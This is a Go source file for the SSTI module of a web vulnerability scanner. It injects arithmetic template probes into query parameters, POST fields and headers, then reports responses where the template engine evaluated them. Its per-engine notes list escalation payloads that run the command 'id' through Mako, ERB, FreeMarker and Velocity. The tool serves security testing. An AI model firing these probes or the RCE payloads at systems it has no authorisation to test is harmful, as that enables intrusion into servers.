package sstiscan

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"scanner/internal/modules/shared"
)

// Engine holds a probe payload + the marker that must appear in the
// response to confirm execution.
type Engine struct {
	Name     string
	Payload  string
	Expect   string // exact substring that proves evaluation
	Note     string // attack chaining tip
	Severity string // "critical" for engine-unique markers (7777777) or
	// exotic engine-specific payload constructions (Handlebars chain);
	// "high" for the arithmetic-only "49" confirmation that overlaps
	// with any language that evaluates 7*7. Audit MEDIUM fix — used to
	// be hardcoded CRITICAL for every hit which prevented triage on
	// the Dashboard severity chart.
}

// Payloads chosen so the response NEVER returns the payload bytes
// verbatim — only the *evaluated* result. e.g. "{{7*7}}" → "49".
var Engines = []Engine{
	{Name: "Jinja2 / Twig (Python/PHP)", Payload: "{{7*7}}", Expect: "49", Severity: "high",
		Note: "Try {{config.items()}} (Jinja2) or {{_self}} (Twig) — typically leads to RCE via __mro__ / .system."},
	{Name: "Jinja2 (filter form)", Payload: "{{7*'7'}}", Expect: "7777777", Severity: "critical",
		Note: "If 7777777 appears → Jinja2 confirmed; '49' only would be Twig."},
	{Name: "Mako (Python)", Payload: "${7*7}", Expect: "49", Severity: "high",
		Note: "Mako accepts ${...}. Try ${os.popen('id').read()} via __import__."},
	{Name: "Smarty (PHP)", Payload: "{php}echo 7*7;{/php}", Expect: "49", Severity: "high",
		Note: "{php}{/php} blocks are disabled in newer versions; try {math equation='7*7'} instead."},
	{Name: "ERB (Ruby)", Payload: "<%= 7*7 %>", Expect: "49", Severity: "high",
		Note: "Use <%= system('id') %> for RCE."},
	{Name: "Velocity (Java)", Payload: "#set($x=7*7)$x", Expect: "49", Severity: "high",
		Note: "Common attack: $rt.exec via Runtime."},
	{Name: "FreeMarker (Java)", Payload: "${7*7}", Expect: "49", Severity: "high",
		Note: "Try ${\"freemarker.template.utility.Execute\"?new()(\"id\")}."},
	{Name: "Mustache / Handlebars", Payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 7*7;\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", Expect: "49", Severity: "critical",
		Note: "Note this only confirms Handlebars (not Mustache logic-less)."},
	{Name: "Pug (Node.js)", Payload: "p=7*7", Expect: "49", Severity: "high",
		Note: "Pug allows JS expressions in attribute / interpolation context."},
	{Name: "EJS (Node.js)", Payload: "<%= 7*7 %>", Expect: "49", Severity: "high",
		Note: "Same syntax as ERB; if the host stack is Node, this is likely EJS."},
}

type Finding struct {
	URL         string `json:"url"`
	Engine      string `json:"engine"`
	Parameter   string `json:"parameter"`
	Payload     string `json:"payload"`
	Marker      string `json:"marker"`
	Severity    string `json:"severity"`
	Note        string `json:"note"`
	Method      string `json:"method,omitempty"`   // GET / POST / HEADER
	Location    string `json:"location,omitempty"` // "query", "body", "header:<Name>"
	RawRequest  string `json:"raw_request,omitempty"`
	RawResponse string `json:"raw_response,omitempty"`
}

type URLResult struct {
	URL      string    `json:"url"`
	Findings []Finding `json:"findings"`
	Tested   int       `json:"tested"`
	Error    string    `json:"error,omitempty"`
}

type ScanResult struct {
	Results []URLResult `json:"results"`
}

type Config struct {
	URLs          []string // each URL with ?param=FUZZ or path FUZZ placeholders
	Params        []string // if URL has no FUZZ placeholder, inject as ?param=
	Concurrency   int
	Timeout       time.Duration
	Method        string   // "GET", "POST", or "both" (default "GET")
	InjectHeaders []string // header names to inject into; default User-Agent/Referer/X-Forwarded-For
}

type ProgressFunc func(done int, msg string)
type PartialFunc func(*ScanResult)

const FuzzMarker = "FUZZ"

// defaultInjectHeaders are the headers most commonly reflected into
// template-rendered error/welcome pages (UA in error pages, Referer in
// "back to previous page" links, XFF in admin/debug dashboards).
var defaultInjectHeaders = []string{"User-Agent", "Referer", "X-Forwarded-For"}

func Scan(ctx context.Context, cfg Config, opts *shared.HTTPOptions, progress ProgressFunc, partial PartialFunc) *ScanResult {
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 5
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 10 * time.Second
	}
	method := strings.ToUpper(strings.TrimSpace(cfg.Method))
	if method == "" {
		method = "GET"
	}
	headers := cfg.InjectHeaders
	if len(headers) == 0 {
		headers = defaultInjectHeaders
	}
	// Build the HTTP client ONCE so the connection pool is shared
	// across every probed URL (audit P: per-URL transports prevented
	// TLS/TCP reuse on same-host scans).
	client := buildClient(cfg.Timeout, opts)
	result := &ScanResult{}
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Concurrency)
	var wg sync.WaitGroup
	done := 0
	// Audit S2: throttle per-URL partial snapshot+marshal to 2s.
	throttle := shared.NewPartialThrottler(2 * time.Second)

	for _, u := range cfg.URLs {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			ur := probeURL(ctx, client, target, cfg.Params, method, headers, opts)
			mu.Lock()
			result.Results = append(result.Results, ur)
			done++
			cur := done
			mu.Unlock()
			if progress != nil {
				progress(cur, fmt.Sprintf("[%d/%d] %s — %d hit(s) of %d probes", cur, len(cfg.URLs), target, len(ur.Findings), ur.Tested))
			}
			if partial != nil && throttle.ShouldFire() {
				mu.Lock()
				snap := &ScanResult{Results: append([]URLResult(nil), result.Results...)}
				mu.Unlock()
				partial(snap)
			}
		}(u)
	}
	wg.Wait()
	if partial != nil {
		throttle.Force()
		mu.Lock()
		snap := &ScanResult{Results: append([]URLResult(nil), result.Results...)}
		mu.Unlock()
		partial(snap)
	}
	return result
}

// injectionPoint describes one place a payload will be placed (query
// param, POST body field, or a request header). The mutate closure
// receives the *http.Request just before the request is sent.
type injectionPoint struct {
	label    string                                              // human-readable label ("q", "body:name", "header:User-Agent")
	method   string                                              // "GET" or "POST"
	location string                                              // "query" | "body" | "header:<Name>"
	build    func(payload string) (*http.Request, string, error) // returns (req, probeURL, err)
}

func probeURL(ctx context.Context, client *http.Client, target string, params []string, method string, injectHeaders []string, opts *shared.HTTPOptions) URLResult {
	ur := URLResult{URL: target}

	// Build injection points.
	var points []injectionPoint

	if strings.Contains(target, FuzzMarker) {
		// FUZZ placeholder mode: only GET path injection, since the
		// user explicitly placed the marker.
		points = append(points, injectionPoint{
			label:    "FUZZ-placeholder",
			method:   "GET",
			location: "query",
			build: func(payload string) (*http.Request, string, error) {
				u := strings.ReplaceAll(target, FuzzMarker, url.QueryEscape(payload))
				req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
				return req, u, err
			},
		})
	} else {
		if len(params) == 0 {
			params = []string{"name", "q", "search", "input", "id", "page", "data", "template"}
		}
		u, err := url.Parse(target)
		if err != nil {
			ur.Error = "invalid URL: " + err.Error()
			return ur
		}

		wantGET := method == "GET" || method == "BOTH"
		wantPOST := method == "POST" || method == "BOTH"

		for _, p := range params {
			p := p
			if wantGET {
				points = append(points, injectionPoint{
					label:    p,
					method:   "GET",
					location: "query",
					build: func(payload string) (*http.Request, string, error) {
						q := u.Query()
						q.Set(p, payload)
						u2 := *u
						u2.RawQuery = q.Encode()
						probeURL := u2.String()
						req, err := http.NewRequestWithContext(ctx, "GET", probeURL, nil)
						return req, probeURL, err
					},
				})
			}
			if wantPOST {
				points = append(points, injectionPoint{
					label:    "body:" + p,
					method:   "POST",
					location: "body",
					build: func(payload string) (*http.Request, string, error) {
						form := url.Values{}
						form.Set(p, payload)
						body := form.Encode()
						req, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(body))
						if err == nil {
							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
						}
						return req, target, err
					},
				})
			}
		}

		// Header-injection points. Most real-world SSTI in headers
		// shows up in template-rendered error/landing pages — see
		// tplmap / sstimap which inject into UA/Referer/XFF by default.
		for _, h := range injectHeaders {
			h := strings.TrimSpace(h)
			if h == "" {
				continue
			}
			points = append(points, injectionPoint{
				label:    "header:" + h,
				method:   "GET",
				location: "header:" + h,
				build: func(payload string) (*http.Request, string, error) {
					req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
					if err == nil {
						req.Header.Set(h, payload)
					}
					return req, target, err
				},
			})
		}
	}

	for _, pt := range points {
		for _, eng := range Engines {
			if ctx.Err() != nil {
				return ur
			}
			ur.Tested++
			req, probeURL, err := pt.build(eng.Payload)
			if err != nil {
				continue
			}
			// Only set a default UA if this point isn't itself
			// injecting into User-Agent (otherwise we'd overwrite
			// the payload).
			if !strings.EqualFold(pt.location, "header:User-Agent") {
				if req.Header.Get("User-Agent") == "" {
					req.Header.Set("User-Agent", "Mozilla/5.0 scaNNer/SSTI")
				}
			}
			if opts != nil {
				opts.ApplyTo(req)
				// opts.ApplyTo may set headers; re-apply the
				// payload header if we're injecting into one to
				// guarantee the payload wins.
				if strings.HasPrefix(pt.location, "header:") {
					hName := strings.TrimPrefix(pt.location, "header:")
					req.Header.Set(hName, eng.Payload)
				}
			}
			rawReq := shared.CaptureRequest(req)
			resp, err := client.Do(req)
			if err != nil {
				if opts != nil {
					opts.RecordError(shared.ClassifyError(err))
				}
				continue
			}
			rawResp := shared.CaptureResponse(resp)
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()

			// Stronger evaluated-vs-echoed test: pages with search
			// boxes / form-repopulate routinely echo the literal
			// payload AND render through the engine elsewhere on the
			// page. Strip every literal occurrence of the payload
			// before checking for the expected marker — this kills
			// the false-negative without killing the false-positive
			// guard.
			bodyStr := string(body)
			stripped := strings.ReplaceAll(bodyStr, eng.Payload, "")
			if !strings.Contains(stripped, eng.Expect) {
				continue
			}
			// Audit MEDIUM fix: tier severity per-engine instead of
			// blanket CRITICAL. Engine-unique markers (7777777) and
			// engine-specific payload constructions (Handlebars chain)
			// stay CRITICAL because a hit unambiguously confirms the
			// engine + evaluation; the arithmetic-only "49" markers
			// drop to HIGH because a page that happens to render "49"
			// through any 7*7-evaluating engine still leaves triage
			// ambiguity across Jinja2/Twig/Mako/Smarty/ERB/Velocity/
			// FreeMarker/Pug/EJS.
			sev := strings.ToUpper(eng.Severity)
			if sev == "" {
				sev = "HIGH"
			}
			ur.Findings = append(ur.Findings, Finding{
				URL:         probeURL,
				Engine:      eng.Name,
				Parameter:   pt.label,
				Payload:     eng.Payload,
				Marker:      eng.Expect,
				Severity:    sev,
				Note:        eng.Note,
				Method:      pt.method,
				Location:    pt.location,
				RawRequest:  rawReq,
				RawResponse: rawResp,
			})
		}
	}
	return ur
}

// buildClient constructs the single shared http.Client used for every
// probe. Prefer this over per-URL clients so the TCP/TLS connection
// pool is reused (audit P: same-host scans were doing one TLS
// handshake per URL otherwise).
func buildClient(timeout time.Duration, opts *shared.HTTPOptions) *http.Client {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DialContext:         shared.BoundDialer(opts, timeout).DialContext,
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 50,
		IdleConnTimeout:     90 * time.Second,
	}
	if opts != nil {
		opts.ApplyTransport(transport)
	}
	return &http.Client{Timeout: timeout, Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}
